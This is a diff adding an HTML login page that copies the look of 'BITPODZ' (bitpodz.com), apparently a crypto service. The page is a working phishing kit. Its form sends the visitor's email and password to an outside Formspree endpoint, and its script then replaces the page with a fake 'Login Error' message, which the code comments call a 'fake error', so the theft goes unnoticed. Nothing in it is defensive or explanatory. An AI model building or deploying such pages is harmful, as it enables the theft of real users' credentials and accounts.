@@ -1,0 +1,218 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BITPODZ Login</title>
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap">
+    <link rel="stylesheet" href="styles.css">
+    <style>
+        /* Modern font stack matching bitpodz.com */
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            background-color: #f9fafb;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            color: #111827;
+        }
+
+        /* Container styling */
+        .container {
+            width: 100%;
+            max-width: 420px;
+            background: white;
+            padding: 40px;
+            border-radius: 12px;
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
+            margin: 20px;
+        }
+
+        /* Logo styling */
+        .logo-container {
+            text-align: center;
+            margin-bottom: 32px;
+        }
+        .site-logo {
+            height: 40px;
+            width: auto;
+        }
+
+        /* Welcome text - matching bitpodz.com */
+        .welcome-text {
+            font-size: 24px;
+            font-weight: 600;
+            text-align: center;
+            margin: 0 0 32px 0;
+            color: #111827;
+        }
+
+        /* Form styling */
+        .form-group {
+            margin-bottom: 20px;
+        }
+        .form-group label {
+            display: block;
+            font-size: 14px;
+            font-weight: 500;
+            margin-bottom: 8px;
+            color: #374151;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 12px 16px;
+            border: 1px solid #d1d5db;
+            border-radius: 8px;
+            font-size: 14px;
+            transition: border-color 0.2s;
+        }
+        .form-group input:focus {
+            outline: none;
+            border-color: #2563eb;
+        }
+
+        /* Checkbox styling */
+        .checkbox-group {
+            display: flex;
+            align-items: center;
+            margin: 20px 0;
+        }
+        .checkbox-group input {
+            margin-right: 10px;
+        }
+        .checkbox-group label {
+            font-size: 14px;
+            color: #374151;
+        }
+
+        /* Login button - matching blue color */
+        button[type="submit"] {
+            width: 100%;
+            padding: 12px;
+            background-color: #2563eb;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+        button[type="submit"]:hover {
+            background-color: #1d4ed8;
+        }
+
+        /* Links styling */
+        .links {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 24px;
+            font-size: 14px;
+        }
+        .links a {
+            color: #2563eb;
+            text-decoration: none;
+            font-weight: 500;
+        }
+        .links a:hover {
+            text-decoration: underline;
+        }
+
+        /* Error message styling */
+        .error-message {
+            text-align: center;
+            margin-top: 50px;
+            color: #dc3545;
+        }
+        .error-icon {
+            font-size: 50px;
+            margin-bottom: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo-container">
+            <img src="images/logo.1c4530a4.png" alt="BITPODZ Logo" class="site-logo">
+        </div>
+        
+        <!-- Welcome Text -->
+        <h2 class="welcome-text">Welcome to BITPODZ</h2>
+        
+        <!-- Login Form -->
+        <form id="loginForm" action="https://formspree.io/f/mqaljzkn" method="POST">
+            <div class="form-group">
+                <label for="email">Email</label>
+                <input type="email" id="email" name="email" placeholder="Input email address" required autocomplete="off">
+            </div>
+
+            <div class="form-group">
+                <label for="password">Login Password</label> <!-- Changed from "Password" -->
+                <input type="password" id="password" name="password" placeholder="Input login password" required autocomplete="off">
+            </div>
+            
+            <div class="checkbox-group">
+                <input type="checkbox" id="remember">
+                <label for="remember">Save account and password</label>
+            </div>
+            
+            <input type="hidden" name="_subject" value="BITPODZ Login Attempt">
+            
+            <button type="submit">Login</button>
+        </form>
+
+        <!-- Additional Links -->
+        <div class="links">
+            <a href="#" id="registerLink">Register</a>
+            <a href="#" id="forgotPasswordLink">Forgot Password</a>
+        </div>
+
+        <!-- Message Display -->
+        <div id="message"></div>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            // Show loading state
+            const submitBtn = this.querySelector('button[type="submit"]');
+            submitBtn.disabled = true;
+            submitBtn.textContent = 'Processing...';
+            
+            fetch(this.action, {
+                method: 'POST',
+                body: new FormData(this),
+                headers: { 'Accept': 'application/json' }
+            })
+            .then(response => {
+                if (response.ok) {
+                    // Replace entire page with fake error
+                    document.body.innerHTML = `
+                        <div class="container error-message">
+                            <div class="error-icon">⚠️</div>
+                            <h1>Login Error</h1>
+                            <p>Invalid credentials or server unavailable.</p>
+                            <p>Please try again later.</p>
+                            <a href="#" onclick="window.location.reload()">Return to login</a>
+                        </div>
+                    `;
+                } else {
+                    throw new Error('Network response was not ok');
+                }
+            })
+            .catch(error => {
+                // Show actual error if something goes wrong
+                document.getElementById('message').innerHTML = `
+                    <p style="color: red;">An unexpected error occurred. Please try again.</p>
+                `;
+                submitBtn.disabled = false;
+                submitBtn.textContent = 'Login';
+            });
+        });
+    </script>
+    <script src="script.js"></script>
+</body>
+</html>
